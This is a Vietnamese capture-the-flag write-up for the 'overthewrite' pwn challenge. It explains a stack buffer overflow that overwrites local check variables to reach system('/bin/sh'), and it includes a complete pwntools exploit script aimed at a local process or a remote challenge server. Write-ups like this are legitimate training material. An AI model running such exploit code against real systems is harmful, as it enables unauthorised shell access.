Giờ ta sẽ nhìn sơ qua file binary được cung cấp và các chế độ bảo vệ:

![image](https://user-images.githubusercontent.com/114044703/213360650-ef1146e6-5afd-4672-92f7-43bac4a32f3c.png)

![image](https://user-images.githubusercontent.com/114044703/213362730-bb6de0e8-891f-4d91-8149-7817fa216624.png)


Vậy chúng ta sẽ làm việc với file binary 64 bit. Khi chạy thì chương trình sẽ yêu cầu ta nhập key khi sai thì dừng chương trình.

![image](https://user-images.githubusercontent.com/114044703/213618940-7c2d504d-855d-4482-8d42-61c0d1cc96d1.png)

![image](https://user-images.githubusercontent.com/114044703/213618919-9caebee7-cceb-4504-bf50-1ab9d29ff439.png)

Sau khi đọc hàm main từ trình ghidra ta thấy chương trình sẽ cho ta nhập 0x50 byte vào biến input sau đó kiểm tra xem num1, num2, num3, welcome có đúng điều kiện không, nếu có thì thực thi system("/bin/sh") không thì kết thúc chương trình

#BUG: Ta nhận thấy input được ghi vào 0x50 dù không đủ để đè save rip nhưng đủ để có thể đè lên biến num1, num2, num3, welcome.

Ý tưởng: 
  - Vậy ta có thể sử dụng lỗi buffer over flow ghi lại num1, num2, num3 và welcome để có thể thực thi system("/bin/sh") 

Ta sẽ khai thác vơi những dữ liệu trên:
```
from pwn import *
debug=1

if debug:
	t=process('./overthewrite')
	#gdb.attach(t,api=True)
else:
	t=remote("159.89.197.210",9992)
	
offset1=0x58-0x20
offset2=0x58-0x18
offset3=0x58-0xc
offset=0x58-0x38

payload=b"A"*(offset)+p64(0x20656d6f636c6557)+p64(0x4353434b206f74)  #Welcome to KCSC
payload=payload.ljust(offset1,b"A")
payload+=p64(0x215241104735f10f)
payload=payload.ljust(offset2,b"A")
payload+=p64(0xdeadbeefcafebabe)
payload=payload.ljust(offset3,b"A")
payload+=p64(0x13371337)

t.send(payload)
t.interactive()
```

Sau khi chạy file:

![image](https://user-images.githubusercontent.com/114044703/213362417-470b3227-4a32-4519-b618-a2fffce4528a.png)




